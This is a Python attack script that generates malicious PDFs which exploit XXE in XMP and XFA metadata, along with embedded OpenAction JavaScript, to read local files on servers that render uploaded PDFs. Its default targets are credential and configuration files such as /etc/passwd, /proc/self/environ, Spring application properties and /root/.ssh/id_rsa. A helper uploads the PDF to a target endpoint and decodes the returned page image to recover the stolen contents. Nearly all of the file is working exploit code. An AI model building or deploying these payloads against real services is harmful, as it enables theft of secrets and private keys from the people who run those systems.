#!/usr/bin/env python3
"""
PDF LFI attack generator — two payloads, both show file content in the rendered image.

  with-js   XMP in-band XXE + JavaScript OpenAction bridge.
            XMP entity reads the local file into <dc:title>.
            JS (Layer 1) harvests it from this.info.Title / this.metadata and
            writes it into a full-page visible AcroForm text field.
            JS (Layer 2) falls back to Net.HTTP.request(file://...) if Layer 1
            yields nothing (renderer does not expand XXE entities).
            Either way, output shows up in the rendered page image.

  no-js     XFA in-band XXE with data binding — no JavaScript at all.
            The XFA XML packet has a <!DOCTYPE> entity pointing to the local
            file. The entity value lands in the XFA <formData> node, which is
            bound to a visible XFA text field on the page. When a renderer
            that supports XFA (Acrobat, Foxit, some Adobe SDKs) opens the
            file, the field displays the file content without any JS.

Usage:
  python3 pdf_render_rce_test.py with-js -o lfi_js.pdf
  python3 pdf_render_rce_test.py with-js --file /proc/self/environ -o lfi_js.pdf

  python3 pdf_render_rce_test.py no-js -o lfi_xfa.pdf
  python3 pdf_render_rce_test.py no-js --file /app/BOOT-INF/classes/application.properties -o lfi_xfa.pdf

  python3 pdf_render_rce_test.py upload --url https://TARGET/api/endpoint \\
      --field file --pdf lfi_js.pdf --token "$TOKEN"
  python3 pdf_render_rce_test.py decode resp_data.txt
"""

import argparse
import base64
import sys


# ---------------------------------------------------------------------------
# Common PDF builder
# ---------------------------------------------------------------------------

def _stream(data: bytes, extra: bytes = b"") -> bytes:
    hdr = b"<< /Length " + str(len(data)).encode()
    if extra:
        hdr += b" " + extra
    return hdr + b" >>\nstream\n" + data + b"\nendstream"


def _build_pdf(objects: dict) -> bytes:
    max_obj = max(objects.keys())
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in range(1, max_obj + 1):
        offsets[n] = len(out)
        body = objects.get(n, b"<< >>")
        out += f"{n} 0 obj\n".encode() + body + b"\nendobj\n"
    xref_offset = len(out)
    out += b"xref\n" + f"0 {max_obj + 1}\n".encode() + b"0000000000 65535 f \n"
    for n in range(1, max_obj + 1):
        out += f"{offsets[n]:010d} 00000 n \n".encode()
    out += (b"trailer\n<< /Size " + f"{max_obj + 1}".encode()
            + b" /Root 1 0 R >>\nstartxref\n" + f"{xref_offset}\n".encode() + b"%%EOF")
    return bytes(out)


# ---------------------------------------------------------------------------
# Payload 1 — with-js: XMP XXE + JS bridge
# ---------------------------------------------------------------------------

DEFAULT_FILES = [
    "/etc/passwd",
    "/proc/self/environ",
    "/app/BOOT-INF/classes/application.properties",
    "/app/BOOT-INF/classes/application.yml",
    "/app/application.properties",
    "/app/application.yml",
    "/root/.ssh/id_rsa",
]


def pdf_with_js(target_files=None) -> bytes:
    """XMP in-band XXE + OpenAction JS.

    Layer 1: XMP entity reads file into <dc:title>.
             JS reads this.info.Title / this.metadata.
    Layer 2: JS direct Net.HTTP.request(file://...) fallback.
    Output goes into a full-page visible AcroForm text field.
    """
    if target_files is None:
        target_files = DEFAULT_FILES

    primary = target_files[0]

    # XMP with in-band XXE (entity in dc:title and xmp:Description)
    xmp = (
        '<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        f'<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file://{primary}"> ]>\n'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
        ' <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        '  <rdf:Description rdf:about=""\n'
        '    xmlns:dc="http://purl.org/dc/elements/1.1/"\n'
        '    xmlns:xmp="http://ns.adobe.com/xap/1.0/">\n'
        '   <dc:title><rdf:Alt><rdf:li xml:lang="x-default">&xxe;</rdf:li></rdf:Alt></dc:title>\n'
        '   <dc:creator><rdf:Seq><rdf:li>&xxe;</rdf:li></rdf:Seq></dc:creator>\n'
        '   <xmp:Description>&xxe;</xmp:Description>\n'
        '  </rdf:Description>\n'
        ' </rdf:RDF>\n'
        '</x:xmpmeta>\n'
        '<?xpacket end="w"?>\n'
    ).encode("utf-8")

    files_js = str(target_files).replace("'", '"')

    js = f"""
var out = "";

// --- Layer 1: harvest XMP entity expansion ---
try {{
  var t = this.info.Title;
  if (t && t.length > 5) out += "==[XXE via Info.Title]===\\n" + t + "\\n\\n";
}} catch(e) {{}}
try {{
  var a = this.info.Author;
  if (a && a.length > 5) out += "==[XXE via Info.Author]===\\n" + a + "\\n\\n";
}} catch(e) {{}}
try {{
  var raw = this.metadata;
  if (raw && raw.length > 50) {{
    var m = raw.match(/<dc:title[\\s\\S]*?<rdf:li[^>]*>([\\s\\S]*?)<\\/rdf:li>/i);
    if (m && m[1] && m[1].length > 5) out += "==[XXE dc:title]===\\n" + m[1] + "\\n\\n";
    var m2 = raw.match(/<xmp:Description[^>]*>([\\s\\S]*?)<\\/xmp:Description>/i);
    if (m2 && m2[1] && m2[1].length > 5) out += "==[XXE xmp:Desc]===\\n" + m2[1] + "\\n\\n";
  }}
}} catch(e) {{ out += "[metadata err: " + e + "]\\n"; }}

// --- Layer 2: direct JS file read (if XXE did not fire) ---
if (out.length < 30) {{
  var files = {files_js};
  for (var i = 0; i < files.length; i++) {{
    try {{
      var r = Net.HTTP.request({{ cType: "text/plain", url: "file://" + files[i] }});
      if (r && r.length > 0) {{ out += "==[JS file: " + files[i] + "]===\\n" + r + "\\n\\n"; break; }}
    }} catch(e) {{}}
    try {{
      var s = util.readFileIntoStream(files[i]);
      if (s) {{ out += "==[readFile: " + files[i] + "]===\\n" + util.stringFromStream(s) + "\\n\\n"; break; }}
    }} catch(e) {{}}
  }}
}}

if (out.length === 0) {{
  out = "[JS ran - no file read succeeded]\\n";
  try {{ out += "viewer: " + app.viewerType + " " + app.viewerVersion; }} catch(e) {{}}
}}

try {{
  var f = this.getField("lfi_out");
  if (f) {{ f.value = out; f.textSize = 7; }}
}} catch(e) {{}}
""".encode("utf-8")

    objects = {}
    objects[8] = _stream(xmp, b"/Type /Metadata /Subtype /XML")
    objects[7] = _stream(js)
    objects[6] = b"<< /Type /Action /S /JavaScript /JS 7 0 R >>"
    objects[5] = (
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (lfi_out) "
        b"/Ff 4096 /Rect [20 30 590 770] "
        b"/DA (/Courier 7 Tf 0 g) /V () /DV () "
        b"/MK << /BG [1 1 1] >> /P 3 0 R >>"
    )
    objects[9] = b"<< /Fields [5 0 R] /NeedAppearances true >>"
    lbl = b"BT /F1 9 Tf 20 778 Td (XMP-XXE + JS-LFI) Tj ET"
    objects[4] = _stream(lbl)
    objects[3] = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> "
        b"/Contents 4 0 R /Annots [5 0 R] >>"
    )
    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objects[1] = (
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/Metadata 8 0 R /AcroForm 9 0 R /OpenAction 6 0 R >>"
    )
    return _build_pdf(objects)


# ---------------------------------------------------------------------------
# Payload 2 — no-js: XFA in-band XXE with data binding
# ---------------------------------------------------------------------------

def pdf_no_js(target_file="/etc/passwd") -> bytes:
    """Pure XFA in-band XXE — no JavaScript.

    The XFA XML packet has a <!DOCTYPE> entity that reads the target file.
    The entity value lands in the <formData> node.
    An XFA text field bound to <formData> displays it on the page.

    Works when the renderer supports XFA (Acrobat, Foxit, Adobe LiveCycle).
    PDFBox does not support XFA, so falls back to a blank field there.
    """
    xfa_xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE xdp:xdp [ <!ENTITY xxe SYSTEM "file://{target_file}"> ]>\n'
        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        '<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">\n'
        '  <xfa:data>\n'
        '    <form1><fileContent>&xxe;</fileContent></form1>\n'
        '  </xfa:data>\n'
        '</xfa:datasets>\n'
        '<template xmlns="http://www.xfa.org/schema/xfa-template/3.6/">\n'
        '  <subform name="form1" layout="tb" locale="en_US">\n'
        '    <pageSet>\n'
        '      <pageArea id="Page1" name="Page1">\n'
        '        <contentArea h="720pt" w="570pt" x="21pt" y="21pt"/>\n'
        '        <medium long="792pt" short="612pt" stock="default"/>\n'
        '      </pageArea>\n'
        '    </pageSet>\n'
        '    <subform h="792pt" name="Page1" w="612pt">\n'
        '      <field h="700pt" name="fileContent" w="570pt" x="21pt" y="50pt">\n'
        '        <ui><textEdit multiLine="1" vScrollPolicy="auto"/></ui>\n'
        '        <font typeface="Courier" size="8pt"/>\n'
        '        <value><text/></value>\n'
        '        <bind match="once" ref="$data.form1.fileContent"/>\n'
        '      </field>\n'
        '      <draw h="20pt" name="label" w="570pt" x="21pt" y="21pt">\n'
        f'        <value><text>XFA XXE LFI probe: {target_file}</text></value>\n'
        '      </draw>\n'
        '    </subform>\n'
        '  </subform>\n'
        '</template>\n'
        '</xdp:xdp>\n'
    ).encode("utf-8")

    xfa_bytes = xfa_xml

    objects = {}
    # XFA stream (the full XDP packet)
    objects[5] = _stream(xfa_bytes)
    # AcroForm with XFA reference
    objects[4] = b"<< /XFA 5 0 R >>"
    # Minimal page (XFA renderers use the XFA template, not this content stream)
    objects[3] = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << >> >>"
    )
    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objects[1] = b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>"
    return _build_pdf(objects)


# ---------------------------------------------------------------------------
# Upload + decode helpers
# ---------------------------------------------------------------------------

def upload(url: str, field: str, pdf_path: str, token: str):
    import requests
    with open(pdf_path, "rb") as fh:
        data = fh.read()
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    files = {field: ("probe.pdf", data, "application/pdf")}
    resp = requests.post(url, headers=headers, files=files, timeout=30)
    print(f"status={resp.status_code}")
    print(resp.text[:3000])
    try:
        j = resp.json()
        for k, v in (j.items() if isinstance(j, dict) else []):
            if isinstance(v, str) and len(v) > 200:
                try:
                    img = base64.b64decode(v)
                    fn = f"resp_{k}.png"
                    with open(fn, "wb") as fh:
                        fh.write(img)
                    print(f"[+] decoded field '{k}' -> {fn}")
                except Exception:
                    pass
    except Exception:
        pass


def decode_image(path: str):
    with open(path) as fh:
        data = fh.read().strip()
    if data.startswith("data:") and "," in data:
        data = data.split(",", 1)[1]
    img_bytes = base64.b64decode(data)
    out = "decoded_response.png"
    with open(out, "wb") as fh:
        fh.write(img_bytes)
    print(f"[+] wrote {out}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="action", required=True)

    wj = sub.add_parser("with-js",
        help="XMP XXE + JS bridge — visible in rendered image (requires JS in renderer)")
    wj.add_argument("-o", "--output", default="lfi_js.pdf")
    wj.add_argument("--file", dest="primary_file", default=None,
        help="primary file to read (default: /etc/passwd)")

    nj = sub.add_parser("no-js",
        help="XFA in-band XXE — visible in rendered image, no JS (requires XFA support)")
    nj.add_argument("-o", "--output", default="lfi_xfa.pdf")
    nj.add_argument("--file", default="/etc/passwd",
        help="server-side file to read")

    ul = sub.add_parser("upload", help="Upload a PDF and auto-decode any image in the response")
    ul.add_argument("--url", required=True)
    ul.add_argument("--field", default="file")
    ul.add_argument("--pdf", required=True)
    ul.add_argument("--token", default="")

    dc = sub.add_parser("decode", help="Decode base64 image from a response file")
    dc.add_argument("path")

    args = ap.parse_args()

    if args.action == "with-js":
        files = DEFAULT_FILES
        if args.primary_file:
            files = [args.primary_file] + [f for f in DEFAULT_FILES if f != args.primary_file]
        pdf = pdf_with_js(target_files=files)
        with open(args.output, "wb") as fh:
            fh.write(pdf)
        print(f"[+] wrote {args.output} ({len(pdf)} bytes)")
        print(f"    Primary target: {files[0]}")
        print("    OpenAction JS:")
        print("      Layer 1 — reads XMP XXE entity from Info.Title / this.metadata")
        print("      Layer 2 — Net.HTTP.request(file://...) direct fallback")
        print("    Output -> visible AcroForm text field on rendered page.")

    elif args.action == "no-js":
        pdf = pdf_no_js(target_file=args.file)
        with open(args.output, "wb") as fh:
            fh.write(pdf)
        print(f"[+] wrote {args.output} ({len(pdf)} bytes)")
        print(f"    XFA XXE -> reads {args.file} into bound text field.")
        print("    Requires XFA-capable renderer (Acrobat, Foxit, Adobe SDK).")
        print("    PDFBox does not support XFA -- field will be empty there.")

    elif args.action == "upload":
        upload(args.url, args.field, args.pdf, args.token)

    elif args.action == "decode":
        decode_image(args.path)


if __name__ == "__main__":
    main()
